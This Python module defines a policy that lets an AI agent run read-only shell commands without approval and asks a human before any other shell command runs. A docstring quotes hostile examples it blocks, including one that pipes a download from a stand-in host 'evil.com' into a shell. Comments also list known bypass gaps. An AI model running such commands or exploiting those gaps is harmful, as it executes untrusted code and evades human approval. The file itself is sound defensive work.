"""Built-in read-only shell command allowlist (shell-surface).

A factory, :func:`allow_read_only_shell`, that recognizes a curated set of
side-effect-free shell commands (per-language/tool presets: core, git, node,
python, rust, docker, k8s, nix, terraform) and ALLOWs them outright, while
ASKing for everything else run through a shell tool. It exists to cut
approval fatigue for the read-only commands an agent runs constantly
(``git status``, ``cat``, ``pytest``, ``cargo check``, ``terraform plan``,
...) without opening the door to mutating or code-executing commands.

Ported from, and narrower than, xtga/agtx's ``permissions/*.toml`` presets:
that project treats "safe for the running phase" as "normal dev workflow"
and includes mutating commands (``git push``/``commit``/``merge``, ``npm
install``, ``cargo build``, ``docker build``/``run``, ``kubectl
apply``/``delete``, ``nixos-rebuild``, plus core utilities like ``rm``/
``mv``/``cp``/``mkdir``). This policy is deliberately narrower — only
commands that cannot mutate the filesystem, mutate the network, or spawn
arbitrary code are included by default. The ``terraform`` preset (covering
both the ``terraform`` and ``tofu`` CLIs) has no agtx equivalent — it was
added here directly. See ``data/shell_readonly_presets.yaml`` for the full
curated set and what was excluded (and why).

The command string is parsed with the same primitives as the other
shell-surface policies (:mod:`omnigent.policies.builtins._shell`): segments
are split on chaining operators, wrapper/env prefixes are stripped, and
shell-interpreter / ``eval`` wrappers are unwrapped and re-parsed
recursively — so the allowlist cannot be bypassed by chaining, wrapping, or
nesting. Output redirection (``>``, ``>>``, ``2>file``) and process
substitution (``<(...)``, ``>(...)``) disqualify a segment from the
allowlist even when the base command matches, since either can turn a
"read-only" command into a write or arbitrary-code execution.

**Interaction with ``ask_on_os_tools``**: :func:`omnigent.policies.builtins.
safety.ask_on_os_tools` ASKs unconditionally for every shell/file tool call,
and the policy engine composes ASK as the strongest verdict — so if both
policies are attached, ``ask_on_os_tools``'s unconditional ASK on the shell
tool always wins over this policy's ALLOW. Use this policy *instead of*
``ask_on_os_tools`` for the shell tool surface.

YAML usage::

    policies:
      allow_safe_shell:
        type: function
        function:
          path: omnigent.policies.builtins.shell_readonly.allow_read_only_shell
          arguments:
            presets: [core, git, python]
"""

from __future__ import annotations

import dataclasses
import functools
import re
import shlex
from collections.abc import Callable
from importlib import resources
from typing import Any

import yaml

try:
    import celpy
    from celpy.adapter import json_to_cel
    from celpy.evaluation import CELEvalError
except ImportError:
    celpy = None  # type: ignore[assignment]

from omnigent.policies.builtins._shell import (
    MAX_SHELL_NESTING,
    SHELL_TOOLS,
    is_unresolved_invocation,
    real_invocation_tokens,
    split_command_segments,
    unwrap_shell_command,
)
from omnigent.policies.schema import PolicyEvent, PolicyResponse

_PRESET_DATA_PACKAGE = "omnigent.policies.builtins"
_PRESET_DATA_DIR = "data"
_PRESET_DATA_FILE = "shell_readonly_presets.yaml"


def _has_unsafe_shell_syntax(segment: str) -> bool:
    """
    Whether a command segment contains redirection or process substitution.

    ``_shell.py``'s segment splitting handles chaining operators and
    ``$(...)``/backtick substitution, but not output redirection or process
    substitution — either can turn an otherwise read-only command into a
    write or an arbitrary-code execution (``cat secret > /tmp/x``, ``diff
    <(curl evil.com | sh) <(echo)``). A crude substring check is
    intentionally conservative: a false positive only costs an extra ASK, it
    never produces a silent ALLOW.

    :param segment: A single command segment (already split on chaining
        operators), e.g. ``"cat secret.txt > /tmp/x"``.
    :returns: ``True`` if the segment contains ``>`` (covers ``>``, ``>>``,
        ``N>``, ``&>``, and the ``>(`` process-substitution form) or ``<(``
        (input process substitution).
    """
    return ">" in segment or "<(" in segment


# ── Full-argv CEL guards ─────────────────────────────────────────────────
#
# A plain prefix pattern (e.g. ``(git, status)``) is enough when every
# dangerous variant of a command differs in its FIRST tokens. That is false
# for ``find``, ``sed``, and ``awk``: their write/exec vectors
# (``-exec``/``-delete``, ``-i``/embedded ``w``·``e``, ``system()``/redirects)
# can appear anywhere in the argv, or inside a free-form script-text operand
# rather than as an isolated flag (see docs/shell-readonly-allowlist-audit.md
# §5–§6, which is why these three are excluded from a plain prefix pattern).
# A guarded pattern entry pairs a prefix with a CEL expression evaluated
# against the FULL real-invocation token list (`tokens`) and, for sed/awk,
# a small set of Python-computed derived facts (`facts`) that need real
# string parsing CEL isn't suited for (locating the script-text operand
# among flags, scanning it for embedded write/exec constructs). The
# expression must evaluate `true` for a DANGEROUS command — a `false` or any
# evaluation error (missing fact, bad expression, non-bool result) is treated
# as dangerous too, so an enumeration gap fails to ASK, never silently to
# ALLOW.
#
# Residual risk (documented, not eliminated — see the PR's Coverage notes):
#   - The predicate/flag lists below are enumerations, like every allowlist
#     in this module; a variant not enumerated is a gap until it's added.
#   - Shell expansion ($(...), $VAR, backticks) inside an argument can change
#     what a command does at runtime without changing its literal tokens;
#     command substitutions are recursively gated (see _shell.py), but a
#     plain variable expansion is not.
#   - The sed/awk script-text scans are regex heuristics over an opaque
#     string, not a real parser for either language; they favor false
#     positives (extra ASK) over false negatives by design, per the
#     ambiguous-must-ASK rule above, but are not exhaustive.


def _find_is_dangerous_facts(tokens: list[str]) -> dict[str, bool]:
    """
    No derived facts needed for ``find`` — its guard checks ``tokens`` (the
    predicate list) directly. Present for interface symmetry with the
    sed/awk extractors and so a guard can always reference ``facts`` without
    a ``KeyError``.

    :param tokens: Real-invocation tokens of the segment (unused).
    :returns: An empty mapping.
    """
    del tokens
    return {}


_SED_SCRIPT_FLAGS = frozenset({"-e", "--expression"})
_SED_FILE_FLAGS = frozenset({"-f", "--file"})

# Trailing s///-command flags that turn a substitution into a write (``w``)
# or an arbitrary shell execution of its output (``e``) — GNU sed extensions
# whose vector lives inside the script text's own delimiter-quoted syntax,
# not an isolated CLI flag. Matches the flag immediately after a same-line
# s-command delimiter (with other flags such as g/i/p optionally between);
# a delimiter that spans a newline is a known residual gap.
_SED_TRAILING_WRITE_RE = re.compile(r"[/|#,~!@:^][a-zA-Z]*w[a-zA-Z]*\s+\S")
_SED_TRAILING_EXEC_RE = re.compile(r"[/|#,~!@:^][a-zA-Z]*e[a-zA-Z]*(?:;|$)", re.MULTILINE)
# A standalone address-command form of the same two vectors:
# ``[addr[,addr]] w file`` and GNU sed's ``[addr] e [command]``.
_SED_ADDR_WRITE_RE = re.compile(r"(?:^|[;\n{])\s*[0-9,$]*\s*[wW]\s+\S")
_SED_ADDR_EXEC_RE = re.compile(r"(?:^|[;\n{])\s*[0-9,$]*\s*e(?:\s|;|$)", re.MULTILINE)


def _sed_script_operands(tokens: list[str]) -> tuple[list[str], bool]:
    """
    Best-effort extraction of ``sed``'s inline script-text operand(s).

    Handles the common forms: a single inline script as the first non-flag
    positional, or one or more ``-e``/``--expression`` scripts (GNU sed joins
    multiple ``-e`` scripts with a newline before running them, so callers do
    the same). A script supplied via ``-f``/``--file`` points at a file this
    function cannot read, so its content can't be scanned — that is reported
    separately as *has_external_script* rather than guessed at.

    :param tokens: Real-invocation tokens with the leading ``sed`` dropped.
    :returns: ``(script_texts, has_external_script)``.
    """
    args = tokens[1:]
    has_external = any(tok in _SED_FILE_FLAGS or tok.startswith("--file=") for tok in args)
    scripts: list[str] = []
    seen_script_source = False
    i = 0
    while i < len(args):
        tok = args[i]
        if tok in _SED_SCRIPT_FLAGS:
            seen_script_source = True
            if i + 1 < len(args):
                scripts.append(args[i + 1])
                i += 2
                continue
        elif tok.startswith("--expression="):
            seen_script_source = True
            scripts.append(tok.split("=", 1)[1])
        elif tok.startswith("-e") and len(tok) > 2:
            seen_script_source = True
            scripts.append(tok[2:])
        elif tok in _SED_FILE_FLAGS:
            # The value is a script FILE this function cannot read, not a
            # positional to scan — skip both the flag and its value.
            seen_script_source = True
            i += 1
        elif tok.startswith("--file="):
            seen_script_source = True
        elif not seen_script_source and not tok.startswith("-") and not scripts:
            # The first bare positional is the inline script only when no
            # -e/-f has claimed that role — subsequent positionals are
            # filenames sed operates on, not more script text.
            scripts.append(tok)
            seen_script_source = True
        i += 1
    return scripts, has_external


def _sed_facts(tokens: list[str]) -> dict[str, bool]:
    """
    Derived facts for the ``sed`` guard: in-place editing and script-text
    write/execute constructs.

    :param tokens: Real-invocation tokens, e.g. ``["sed", "-i", "s/a/b/", "f"]``.
    :returns: Mapping with ``has_inplace``, ``has_external_script``,
        ``has_write_command``, and ``has_execute_flag`` booleans.
    """
    args = tokens[1:]
    has_inplace = any(
        tok == "--in-place"
        or tok.startswith("--in-place=")
        or (tok.startswith("-") and not tok.startswith("--") and "i" in tok[1:])
        for tok in args
    )
    scripts, has_external = _sed_script_operands(tokens)
    blob = "\n".join(scripts)
    has_write = bool(_SED_TRAILING_WRITE_RE.search(blob) or _SED_ADDR_WRITE_RE.search(blob))
    has_exec = bool(_SED_TRAILING_EXEC_RE.search(blob) or _SED_ADDR_EXEC_RE.search(blob))
    return {
        "has_inplace": has_inplace,
        "has_external_script": has_external,
        "has_write_command": has_write,
        "has_execute_flag": has_exec,
    }


_AWK_SEP_VALUE_FLAGS = frozenset({"-F", "--field-separator"})
_AWK_ASSIGN_VALUE_FLAGS = frozenset({"-v", "--assign"})
_AWK_FILE_VALUE_FLAGS = frozenset({"-f", "--file"})


def _awk_script_operand(tokens: list[str]) -> tuple[str | None, bool]:
    """
    Best-effort extraction of ``awk``'s program-text operand.

    Walks the argv skipping flags known to take a value (``-F``/``-v`` in
    either the separate-token or attached form, ``-f``/``--file``) to reach
    the first bare positional, which is the program text in the common
    ``awk 'PROGRAM' file...`` / ``awk -F: 'PROGRAM' file`` forms. A program
    supplied via ``-f``/``--file`` points at a file this function cannot
    read — reported as *has_external_script* rather than guessed at. An
    unrecognized flag is skipped conservatively (as a valueless flag) rather
    than guessed to take a value, so it doesn't swallow the real program text.

    :param tokens: Real-invocation tokens with the leading ``awk`` dropped.
    :returns: ``(script_text, has_external_script)`` — *script_text* is
        ``None`` when no bare positional was found before a ``-f``/``--file``
        (i.e. the only program source is an external file).
    """
    args = tokens[1:]
    i = 0
    while i < len(args):
        tok = args[i]
        if tok in _AWK_FILE_VALUE_FLAGS or tok.startswith("--file="):
            # The program comes entirely from a file this function cannot
            # read; any remaining positionals are input files, not more
            # program text, so there is nothing further to scan.
            return None, True
        if tok in _AWK_SEP_VALUE_FLAGS or tok in _AWK_ASSIGN_VALUE_FLAGS:
            i += 2
            continue
        if tok.startswith(("--field-separator=", "--assign=")):
            i += 1
            continue
        if tok.startswith(("-F", "-v")) and len(tok) > 2:
            i += 1
            continue
        if tok == "-i":
            # gawk's extension loader (``-i inplace``) — the extension name
            # is not the program text; the inplace-editing check itself
            # reads the flag directly, independent of this walk.
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        return tok, False
    return None, False


def _awk_facts(tokens: list[str]) -> dict[str, bool]:
    """
    Derived facts for the ``awk`` guard: in-place editing, an external
    script file, and program-text write-redirection / ``system()`` calls.

    A bare ``>``/``>>`` inside the program text is flagged even though awk
    also uses ``>`` as a numeric/string comparison operator — the two are
    not distinguishable without a real awk parser, and per the
    ambiguous-must-ASK rule this module never guesses that a ``>`` is "just"
    a comparison. In practice ``has_redirect`` is redundant with — not the
    only thing catching — that case today: ``_has_unsafe_shell_syntax``
    already rejects ANY segment containing a literal ``>`` before a guard is
    ever evaluated, including one inside this script text's quotes. It is
    computed here anyway so the guard is correct standalone (and directly
    unit-tested as such), independent of that coarser, whole-segment check.

    :param tokens: Real-invocation tokens, e.g. ``["awk", "{print $1}"]``.
    :returns: Mapping with ``has_inplace``, ``has_external_script``,
        ``has_redirect``, and ``has_system_call`` booleans.
    """
    has_inplace = any(tok == "-i" for tok in tokens[1:])
    script, has_external = _awk_script_operand(tokens)
    if script is None:
        return {
            "has_inplace": has_inplace,
            "has_external_script": True,
            "has_redirect": False,
            "has_system_call": False,
        }
    return {
        "has_inplace": has_inplace,
        "has_external_script": has_external,
        "has_redirect": ">" in script,
        "has_system_call": "system(" in script or "system (" in script,
    }


_GUARD_FACT_EXTRACTORS: dict[str, Callable[[list[str]], dict[str, bool]]] = {
    "find": _find_is_dangerous_facts,
    "sed": _sed_facts,
    "awk": _awk_facts,
}


def _compile_guard(
    expression: str,
    facts_fn: Callable[[list[str]], dict[str, bool]],
) -> Callable[[list[str]], bool]:
    """
    Compile a pattern entry's CEL guard expression into a callable.

    :param expression: CEL expression over ``tokens`` (the segment's full
        real-invocation token list) and ``facts`` (the base command's
        derived-fact mapping). Must evaluate to a bool; ``true`` means the
        command is DANGEROUS (the pattern does not grant ALLOW).
    :param facts_fn: The base command's fact extractor
        (:data:`_GUARD_FACT_EXTRACTORS`).
    :returns: A callable ``(tokens) -> bool`` — ``True`` when dangerous.
    :raises ImportError: If ``cel-python`` is not installed.
    :raises ValueError: If *expression* has a CEL syntax error.
    """
    if celpy is None:
        raise ImportError(
            "cel-python is required for guarded shell_readonly patterns but is not installed."
        )
    env = celpy.Environment()
    prog = env.program(env.compile(expression))

    def _guard(tokens: list[str]) -> bool:
        try:
            result = prog.evaluate(
                {
                    "tokens": json_to_cel(list(tokens)),
                    "facts": json_to_cel(facts_fn(tokens)),
                }
            )
        except (CELEvalError, ValueError, TypeError):
            # An expression that can't evaluate against this argv (missing
            # fact, unexpected shape) is exactly the "ambiguous" case the
            # guard exists to fail closed on.
            return True
        return bool(result)

    return _guard


@dataclasses.dataclass(frozen=True)
class _PatternRule:
    """
    One allowlist pattern: a literal token prefix plus an optional guard.

    :ivar tokens: The prefix pattern, e.g. ``("git", "status")``.
    :ivar guard: When set, a compiled CEL guard (:func:`_compile_guard`) that
        must return ``False`` (not dangerous) for a prefix match to count as
        safe. ``None`` means the prefix alone is sufficient, as for every
        plain (unguarded) preset entry.
    """

    tokens: tuple[str, ...]
    guard: Callable[[list[str]], bool] | None = None


@functools.lru_cache(maxsize=1)
def _preset_data() -> dict[str, Any]:  # type: ignore[explicit-any]
    """
    Load and cache the raw bundled preset YAML.

    :returns: Parsed YAML mapping of preset name to
        ``{"description": str, "commands": list[list[str]]}``.
    """
    path = resources.files(_PRESET_DATA_PACKAGE).joinpath(_PRESET_DATA_DIR, _PRESET_DATA_FILE)
    return yaml.safe_load(path.read_text()) or {}


@functools.lru_cache(maxsize=1)
def _load_presets() -> dict[str, list[_PatternRule]]:
    """
    Load the bundled read-only command presets as matchable pattern rules.

    A preset's ``commands`` entries are either a plain list of literal
    tokens (``[git, status]`` — the prefix alone is sufficient) or a mapping
    with ``pattern`` and ``guard`` keys (``{pattern: [find], guard: "..."}``
    — see :data:`_GUARD_FACT_EXTRACTORS`), whose CEL guard is compiled once
    here and cached for the process lifetime.

    :returns: Mapping of preset name (``"core"``, ``"git"``, ...) to a list
        of :class:`_PatternRule`.
    """
    presets: dict[str, list[_PatternRule]] = {}
    for name, entry in _preset_data().items():
        commands = entry.get("commands", []) if isinstance(entry, dict) else []
        rules: list[_PatternRule] = []
        for cmd in commands:
            if not cmd:
                continue
            if isinstance(cmd, dict):
                pattern = tuple(cmd["pattern"])
                guard_expr = cmd.get("guard")
                guard = (
                    _compile_guard(guard_expr, _GUARD_FACT_EXTRACTORS[pattern[0]])
                    if guard_expr
                    else None
                )
                rules.append(_PatternRule(pattern, guard))
            else:
                rules.append(_PatternRule(tuple(cmd)))
        presets[name] = rules
    return presets


def list_read_only_presets() -> dict[str, str]:
    """
    List the bundled preset names and their descriptions.

    For callers (UI, docs) that want to show available presets without
    hardcoding the set.

    :returns: Mapping of preset name to its human-readable description.
    """
    return {
        name: (entry.get("description", "") if isinstance(entry, dict) else "")
        for name, entry in _preset_data().items()
    }


_WILDCARD_TOKEN = "*"


def _matches_pattern(tokens: list[str], pattern: tuple[str, ...]) -> bool:
    """
    Whether real-invocation *tokens* start with *pattern*.

    The first token is compared by basename so an absolute-path invocation
    (``/usr/bin/git status``) matches like the bare word. Remaining pattern
    tokens are compared literally against the following tokens (subcommand
    words), so ``("git", "status")`` matches ``["git", "status", "-s"]`` but
    not ``["git", "stash"]`` — except a pattern token that is exactly
    ``"*"``, which matches any single token in that position. This is for
    an argument whose *value* doesn't change the command's safety, only
    where it targets — e.g. ``("git", "-C", "*", "status")`` matches
    ``git -C <any path> status`` without pinning a literal path, since
    ``git status`` is read-only no matter which repo it targets. Only ever
    put a wildcard where every possible value is equally safe: a wildcard
    in the subcommand position itself would allow-list far more than
    intended.

    :param tokens: Real-invocation tokens of one segment, e.g.
        ``["git", "status", "-s"]``.
    :param pattern: A command pattern from a preset, e.g.
        ``("git", "status")`` or ``("git", "-C", "*", "status")``.
    :returns: ``True`` if *tokens* starts with *pattern*.
    """
    if len(tokens) < len(pattern):
        return False
    head = tokens[0].rsplit("/", 1)[-1]
    if pattern[0] != _WILDCARD_TOKEN and head != pattern[0]:
        return False
    return all(
        pat_tok in (_WILDCARD_TOKEN, tok)
        for pat_tok, tok in zip(pattern[1:], tokens[1 : len(pattern)], strict=True)
    )


def allow_read_only_shell(
    presets: list[str] | None = None,
    extra_allow: list[list[str]] | None = None,
    shell_tools: list[str] | None = None,
) -> Callable[[PolicyEvent], PolicyResponse | None]:
    """
    Build a policy callable that auto-allows a curated read-only command set.

    :param presets: Names of bundled presets to enable, e.g.
        ``["core", "git", "python"]``. Defaults to ``["core"]`` when omitted
        or empty. Unknown names are ignored (no error — a caller can pass a
        preset list without checking it against the current bundle).
    :param extra_allow: Additional command patterns beyond the bundled
        presets, each a list of literal tokens, e.g. ``[["make", "test"]]``.
        Merged with the selected presets' patterns.
    :param shell_tools: Names of the shell tools whose ``command`` argument
        is parsed. ``None`` uses every harness's shell tool
        (:data:`~omnigent.policies.builtins._shell.SHELL_TOOLS`).
    :returns: A one-argument policy callable. Returns ``{"result": "ALLOW"}``
        when every segment of the command matches an enabled pattern,
        ``{"result": "ASK", "reason": ...}`` otherwise, or ``None`` (abstain)
        for non-shell-tool events.
    """
    all_presets = _load_presets()
    selected_names = presets if presets else ["core"]
    patterns: list[_PatternRule] = []
    for name in selected_names:
        patterns.extend(all_presets.get(name, []))
    for extra in extra_allow or []:
        patterns.append(_PatternRule(tuple(extra)))

    shell_tool_names = (
        frozenset(shell_tools) if shell_tools is not None else frozenset(SHELL_TOOLS)
    )

    def _segment_is_safe(segment: str, _depth: int = 0) -> bool:
        """
        Whether one command segment matches the enabled allowlist.

        Recursively unwraps shell-interpreter / ``eval`` wrappers so ``bash
        -c "git push"`` is judged like a bare ``git push`` rather than
        slipping past as an opaque ``bash -c`` invocation.

        :param segment: A single command segment.
        :param _depth: Internal recursion guard; callers leave it 0.
        :returns: ``True`` if the segment is safe to auto-allow.
        """
        if _depth > MAX_SHELL_NESTING:
            return False
        if _has_unsafe_shell_syntax(segment):
            return False
        try:
            tokens = shlex.split(segment)
        except ValueError:
            return False
        tokens = real_invocation_tokens(tokens)
        if not tokens or is_unresolved_invocation(tokens):
            return False
        inner = unwrap_shell_command(tokens)
        if inner is not None:
            return _segment_is_safe(inner, _depth + 1)
        for rule in patterns:
            if not _matches_pattern(tokens, rule.tokens):
                continue
            if rule.guard is None or not rule.guard(tokens):
                return True
            # Prefix matched but the guard flagged this invocation as
            # dangerous (e.g. `find ... -exec`) — keep checking in case a
            # different rule also matches and isn't guarded.
        return False

    def _evaluate_command(command: str) -> PolicyResponse:
        """
        Evaluate a full shell command string against the allowlist.

        :param command: The shell command string, e.g. ``"git status && ls"``.
        :returns: ``{"result": "ALLOW"}`` when every segment is safe,
            otherwise ``{"result": "ASK", "reason": ...}`` naming the first
            segment that isn't covered.
        """
        for segment in split_command_segments(command):
            if not _segment_is_safe(segment):
                return {
                    "result": "ASK",
                    "reason": f"Agent wants to run {segment[:80]!r}, which is not on the "
                    f"read-only allowlist. Approve?",
                }
        return {"result": "ALLOW"}

    def _evaluate(event: PolicyEvent) -> PolicyResponse | None:
        """
        Evaluate one policy event against the read-only shell allowlist.

        Acts on ``tool_call`` events for the configured shell tools only;
        abstains on everything else so the policy composes with others
        (e.g. a separate approval gate for Read/Write/Edit tools).

        :param event: The policy event.
        :returns: A :class:`PolicyResponse`, or ``None`` to abstain.
        """
        if event.get("type") != "tool_call":
            return None
        data = event.get("data")
        if not isinstance(data, dict):
            return None
        if data.get("name") not in shell_tool_names:
            return None
        args = data.get("arguments")
        args = args if isinstance(args, dict) else {}
        command = args.get("command")
        if not isinstance(command, str) or not command.strip():
            return None
        return _evaluate_command(command)

    return _evaluate


# ── Registry ─────────────────────────────────────────────────────────────────

POLICY_REGISTRY: list[dict[str, Any]] = [  # type: ignore[explicit-any]
    {
        "handler": "omnigent.policies.builtins.shell_readonly.allow_read_only_shell",
        "kind": "factory",
        "name": "Allow Read-Only Shell Commands",
        "description": (
            "Auto-ALLOWs a curated set of side-effect-free shell commands "
            "(per-language presets: core, git, node, python, rust, docker, "
            "k8s, nix, terraform) and ASKs for everything else run through "
            "a shell tool. Chained, wrapped (sudo/timeout/bash -c), and redirected "
            "commands are parsed so the allowlist cannot be bypassed. Use "
            "instead of 'Require Approval for File & Shell Operations' for "
            "the shell surface — attaching both means the shell always "
            "asks, since ASK always wins when policies disagree."
        ),
        "params_schema": {
            "type": "object",
            "properties": {
                "presets": {
                    "type": "array",
                    "items": {
                        "type": "string",
                        "enum": [
                            "core",
                            "git",
                            "node",
                            "python",
                            "rust",
                            "docker",
                            "k8s",
                            "nix",
                            "terraform",
                        ],
                    },
                    "description": "Bundled preset names to enable.",
                    "default": ["core"],
                },
                "extra_allow": {
                    "type": "array",
                    "items": {"type": "array", "items": {"type": "string"}},
                    "description": "Extra command patterns beyond the presets, "
                    'each a token list, e.g. [["make", "test"]]. A token that is '
                    'exactly "*" matches any single value at that position — use it '
                    "only where every possible value is equally safe, e.g. "
                    '[["git", "-C", "*", "status"]] for git status against any repo.',
                },
                "shell_tools": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Shell tools whose command arg is parsed "
                    "(default: every harness's shell tool).",
                },
            },
        },
    },
]
